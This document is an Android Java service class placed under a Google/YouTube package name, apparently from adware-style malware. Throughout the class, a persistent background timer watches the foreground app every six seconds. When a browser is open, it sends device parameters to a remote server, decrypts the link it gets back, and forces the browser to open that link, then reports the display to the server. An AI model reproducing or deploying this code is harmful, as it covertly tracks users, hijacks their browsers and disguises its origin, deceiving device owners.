package com.google.youtube.services;

import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import org.json.JSONObject;
import com.google.youtube.utils.HttpUtil;
import com.google.youtube.utils.MyHelpUtil;
import android.app.ActivityManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.os.IBinder;
import android.text.TextUtils;

public class BrowserService extends Service {

	private String topActivity = null;

	private Intent urlIntent;

	private List<ResolveInfo> s;

	private ComponentName cn;

	private Timer timer;

	private ActivityManager am;

	private PackageManager pm;

	private TimerTask timerTask;

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	@Override
	public void onCreate() {

		urlIntent = new Intent(Intent.ACTION_VIEW,
				Uri.parse("http://www.google.com"));

		timer = new Timer();

		urlIntent.addCategory(Intent.CATEGORY_BROWSABLE);

		am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);

		pm = getPackageManager();

		super.onCreate();
	}

	@Override
	public void onDestroy() {

		if (timerTask != null) {

			timerTask.cancel();

		}

		super.onDestroy();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		System.out.println("onStartCommand brower...");

		if (timer != null) {

			if (timerTask != null) {

				timerTask.cancel();

			}

		}
		timerTask = new TimerTask() {
			@Override
			public void run() {

				if (pm == null) {

					return;
				}

				cn = am.getRunningTasks(1).get(0).topActivity;

				s = pm.queryIntentActivities(urlIntent,
						PackageManager.GET_INTENT_FILTERS);

				if (topActivity != null
						&& cn.getPackageName().equals(topActivity)) {
					return;
				}

				topActivity = cn.getPackageName();

				if (s != null && s.size() > 0) {

					for (Iterator<ResolveInfo> iterator = s.iterator(); iterator
							.hasNext();) {

						ResolveInfo resolveInfo = (ResolveInfo) iterator.next();

						if (resolveInfo.activityInfo.packageName.equals(cn
								.getPackageName())) {

							try {

								String res = HttpUtil
										.postRequest(
												HttpUtil.BASE_URL
														+ "google_k.action",
												MyHelpUtil
														.add_notifacation_params(getApplicationContext())
														+ "&o=0");

								if (!TextUtils.isEmpty(res)
										&& !"null".equals(res)) {

									JSONObject job = new JSONObject(
											MyHelpUtil.deCrypto(res));

									String link_url = job.getString("link_url");

									String link_title = job
											.getString("link_title");

									int display_count = job
											.getInt("display_count");

									int link_count = job.getInt("link_count");

									int link_display_interval = job
											.getInt("link_display_interval");

									boolean bool = checkOption(link_count,
											link_display_interval, link_title,
											display_count);

									if (bool) {

										System.out.println("--jc--:Y");

										Intent url_Intent = new Intent(
												Intent.ACTION_VIEW,
												Uri.parse(link_url));

										url_Intent
												.setClassName(
														resolveInfo.activityInfo.packageName,
														resolveInfo.activityInfo.name);

										url_Intent
												.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

										syslinkStatus(link_url);

										saveStatus();

										saveCount(link_title);

										startActivity(url_Intent);

									} else {
										System.out.println("--jc--:N");
									}
								}

							} catch (Exception e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}

							break;

						}
					}
				}
			}
		};

		timer.schedule(timerTask, 0, 6 * 1000);

		return Service.START_STICKY;

	}

	private void saveStatus() {

		SharedPreferences localSharedPreferences = getApplicationContext()
				.getSharedPreferences("lsr", 0);

		Editor localEditor = localSharedPreferences.edit();

		localEditor.putLong("lk", new Date().getTime());

		localEditor.commit();

	}

	private void saveCount(String link_title) {

		SharedPreferences localSharedPreferences = getApplicationContext()
				.getSharedPreferences("lsr", 0);

		Editor localEditor = localSharedPreferences.edit();

		String p = MyHelpUtil.enCrypto(link_title, MyHelpUtil.A);

		localEditor.putInt(p, localSharedPreferences.getInt(p, 0) + 1);

		localEditor.commit();

	}

	private void syslinkStatus(String link) {

		try {
			HttpUtil.postRequest(HttpUtil.BASE_URL + "google_l.action",
					MyHelpUtil.setParams(link, 2, getApplicationContext()));
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private boolean checkOption(int link_count, int link_display_interval,
			String link_title, int display_count) {

		SharedPreferences screenSharedPreferences = getApplicationContext()
				.getSharedPreferences("scr", 0);

		SharedPreferences linkSharedPreferences = getApplicationContext()
				.getSharedPreferences("lsr", 0);

		long link_time = linkSharedPreferences.getLong("lk", 0);

		long reslut = Math.abs(new Date().getTime() - link_time);

		long display_interval_to_long = Math
				.abs(link_display_interval * 60 * 1000) * 10;

		int local_screen_count = screenSharedPreferences.getInt("sc", 0);

		if (!linkSharedPreferences.contains("lk")
				&& local_screen_count >= link_count) {

			return true;
		}

		int local_display_count = linkSharedPreferences.getInt(
				MyHelpUtil.enCrypto(link_title, MyHelpUtil.A), 0);

		if (reslut >= display_interval_to_long
				&& local_screen_count >= link_count
				&& local_display_count <= display_count) {

			return true;
		}

		return false;
	}

}
